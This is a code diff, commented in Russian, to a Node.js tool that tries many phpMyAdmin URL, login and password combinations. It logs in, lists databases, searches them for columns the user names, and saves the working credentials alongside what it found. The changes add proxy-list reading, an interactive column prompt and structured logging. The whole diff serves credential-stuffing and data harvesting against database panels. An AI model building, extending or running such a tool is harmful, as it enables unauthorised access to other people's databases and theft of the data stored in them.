@@ -2,6 +2,8 @@ const fs = require('fs');
 const cheerio = require("cheerio");
 const axios = require("axios");
 const winston = require("winston");
+const readline = require('readline');
+const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 require('dotenv').config();
 
 // Настройка логгера
@@ -16,6 +18,17 @@ const logger = winston.createLogger({
         new winston.transports.File({ filename: './logs/app.log' })
     ]
 });
+
+// Чтение прокси из файла
+function readProxies(filename) {
+    if (fs.existsSync(filename)) {
+        return fs.readFileSync(filename, 'utf-8')
+            .split('\n')
+            .map(line => line.trim())
+            .filter(line => line);
+    }
+    return [];
+}
 
 function readFileIfExists(filename) {
     if (fs.existsSync(filename)) {
@@ -110,7 +123,7 @@ for (const obj of combinations) {
 // Преобразуем обратно в Set
 const uniqueCombinations = new Set(uniqueMap.values());
 
-console.log(`✅ Сформировано ${uniqueCombinations.size} комбинаций для тестирования.`);
+logger.info(`✅ Сформировано ${uniqueCombinations.size} комбинаций для тестирования.`);
 
 class PmaClient {
 
@@ -126,12 +139,14 @@ class PmaClient {
      pmaAuth_1;
      encodedAuth; // для авторизации при ['auth_type'] = 'http'
      session;
+     proxy;
 
-    constructor(phpMyAdminUrl, login, password) {
+    constructor(phpMyAdminUrl, login, password, proxy) {
         this.phpMyAdminUrl = phpMyAdminUrl.endsWith('/') ? phpMyAdminUrl : phpMyAdminUrl + '/';
         this.queryUrl = `${this.phpMyAdminUrl.replace(/index\.php\/?$/, '')}import.php`;
         this.login = login;
         this.password = password;
+        this.proxy = proxy;
     }
 
     updateCookies(newCookies) {
@@ -178,7 +193,6 @@ class PmaClient {
             });
             // Получаем куки из ответа
             const rawCookies = response.headers["set-cookie"];
-            //console.log('rawCookies' + rawCookies + '\n');
             if (rawCookies) {
                 this.updateCookies(rawCookies);
             }
@@ -212,11 +226,9 @@ class PmaClient {
 
             // ищем токен в Headers.Location
             const location = loginResponse.headers?.location;
-            //console.log('LOCATION: ' + location)
             if (location.includes('token=')) {
                 const tokenMatch = location.match(/[?&]token=([^&]+)/);
                 this.token = tokenMatch ? tokenMatch[1] : undefined;
-                //console.log(`Assigned token from LOCATION: ${this.token}`);
             } else {
             //если нет в Location - делаем Get запрос
                 const response1 = await axios.get(this.phpMyAdminUrl, {
@@ -233,10 +245,10 @@ class PmaClient {
                     this.updateCookies(cookies)
                 }
             }
-            console.log(`✅ Авторизация успешна (${this.phpMyAdminUrl}:${this.login}:${this.password}).`);
+            logger.info(`✅ Авторизация успешна (${this.phpMyAdminUrl}:${this.login}:${this.password}).`);
             return true;
         } catch (error) {
-            console.log(`❌ Ошибка авторизации (${this.login}:${this.password}) → ${error.message} -> ${error.stack}`);
+            logger.error(`❌ Ошибка авторизации (${this.login}:${this.password}) → ${error.message} -> ${error.stack}`);
             return false;
         }
     };
@@ -268,10 +280,10 @@ class PmaClient {
             // Извлекаем токен из HTML ответа
             this.updateToken(loginResponse.data);
 
-            console.log(`✅ Авторизация успешна (${this.login}:${this.password}).`);
+            logger.info(`✅ Авторизация успешна (${this.login}:${this.password}).`);
             return true;
         } catch (error) {
-            console.log(`❌ Ошибка авторизации (${this.login}:${this.password}) → ${error.message} -> ${error.stack}`);
+            logger.error(`❌ Ошибка авторизации (${this.login}:${this.password}) → ${error.message} -> ${error.stack}`);
             return false;
             //throw error;
         }
@@ -305,12 +317,12 @@ class PmaClient {
             const databases = $('table.table_results tbody tr').map((_, row) => {
                 return $(row).find('td').first().text().trim();
             }).get();
-            console.log(`Найденные базы данных (${databases.length}): \x1b[32m${databases.join(", ")}\x1b[0m`);
+            logger.info(`Найденные базы данных (${databases.length}): ${databases.join(", ")}`); //\x1b[32m${databases.join(", ")}\x1b[0m
             //this.updateCookies()
             return databases;
 
         } catch (error) {
-            console.log("❌ Ошибка выполнения SQL-запроса:", error.message);
+            logger.error("❌ Ошибка выполнения SQL-запроса:", error.message);
         }
     }
 
@@ -387,11 +399,30 @@ class PmaClient {
     }
 }
 
+// Создаем интерфейс для чтения ввода
+const rl = readline.createInterface({
+    input: process.stdin,
+    output: process.stdout
+});
+
+// Функция для запроса ввода у пользователя
+function askForColumns() {
+    return new Promise((resolve) => {
+        rl.question('Введите названия колонок для поиска (через запятую): ', (input) => {
+            resolve(input);
+        });
+    });
+}
+
 // === Цикл перебора комбинаций ===
 (async () => {
     const results = []; // Массив для хранения результатов таблиц
 
-    for (const { url, login, password } of uniqueCombinations) {
+    // Запрашиваем у пользователя названия колонок
+    const columnsToFind = await askForColumns();
+    logger.info(`Поиск колонок: ${columnsToFind}`);
+
+    for (const {url, login, password} of uniqueCombinations) {
         const client = new PmaClient(url, login, password);
         if (await client.loginAndGetCookies()) {
             const databases = await client.executeSQLQuery("SHOW DATABASES;");
@@ -405,9 +436,9 @@ class PmaClient {
             for (const database of databases) {
 
                 // Поиск колонок
-                const columnsToFind = 'name, table';
                 const foundColumns = await client.findColumnsInTables(database, columnsToFind);
                 if (foundColumns.length > 0) {
+                    logger.info(`Найдены результаты для записи из БД ${database} в found_columns.txt`);
                     foundColumns.forEach((column) => {
                         fs.appendFileSync('./results/found_columns.txt', `${url}:${login}:${password}|${column}\n`);
                     });
@@ -428,8 +459,11 @@ class PmaClient {
 
     if (results.length > 0) {
         fs.writeFileSync('./results/all_tables.json', JSON.stringify(results, null, 2));
-        logger.info('Результаты таблиц успешно записаны в all_tables.json');
+        logger.info(`Результаты таблиц успешно записаны в all_tables.json`);
     } else {
         logger.warn('Нет данных для записи в all_tables.json');
     }
+
+    // Закрываем интерфейс readline
+    rl.close();
 })();
